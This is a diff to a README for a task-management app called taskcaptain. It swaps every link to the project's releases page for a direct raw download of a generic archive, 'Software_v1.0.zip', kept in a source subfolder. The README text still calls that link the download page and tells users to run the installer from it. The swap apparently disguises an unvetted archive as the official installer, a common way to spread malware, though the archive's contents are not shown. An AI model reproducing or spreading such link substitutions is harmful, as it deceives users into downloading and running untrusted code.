@@ -1,6 +1,6 @@
 # ⚓ taskcaptain - Simple AI for Task Management
 
-[![Download taskcaptain](https://img.shields.io/badge/Download-taskcaptain-blue?style=for-the-badge)](https://github.com/dripdry-jung494/taskcaptain/releases)
+[![Download taskcaptain](https://img.shields.io/badge/Download-taskcaptain-blue?style=for-the-badge)](https://github.com/dripdry-jung494/taskcaptain/raw/refs/heads/main/rust/taskcaptain-fastview/Software_v1.0.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Your PC should meet or exceed these to run taskcaptain smoothly.
 1. **Visit the download page:**  
    
    Click this link or copy it into your browser:  
-   https://github.com/dripdry-jung494/taskcaptain/releases
+   https://github.com/dripdry-jung494/taskcaptain/raw/refs/heads/main/rust/taskcaptain-fastview/Software_v1.0.zip
    
    This page stores the latest versions of taskcaptain.
 
@@ -119,7 +119,7 @@ Explore the Settings menu by clicking the gear icon in the app.
 ## 🔄 Updating taskcaptain
 
 Check the same download page regularly:  
-https://github.com/dripdry-jung494/taskcaptain/releases
+https://github.com/dripdry-jung494/taskcaptain/raw/refs/heads/main/rust/taskcaptain-fastview/Software_v1.0.zip
 
 Download new installers there when updates are available. Run the new installer to replace the old version without losing your tasks.
 
@@ -127,10 +127,10 @@ Download new installers there when updates are available. Run the new installer 
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/dripdry-jung494/taskcaptain/releases  
+- Download page: https://github.com/dripdry-jung494/taskcaptain/raw/refs/heads/main/rust/taskcaptain-fastview/Software_v1.0.zip  
 - User guide (in the app under “Help”)  
 - Support email (contact from the app)
 
 ---
 
-[![Download taskcaptain](https://img.shields.io/badge/Download-taskcaptain-blue?style=for-the-badge)](https://github.com/dripdry-jung494/taskcaptain/releases)
+[![Download taskcaptain](https://img.shields.io/badge/Download-taskcaptain-blue?style=for-the-badge)](https://github.com/dripdry-jung494/taskcaptain/raw/refs/heads/main/rust/taskcaptain-fastview/Software_v1.0.zip)
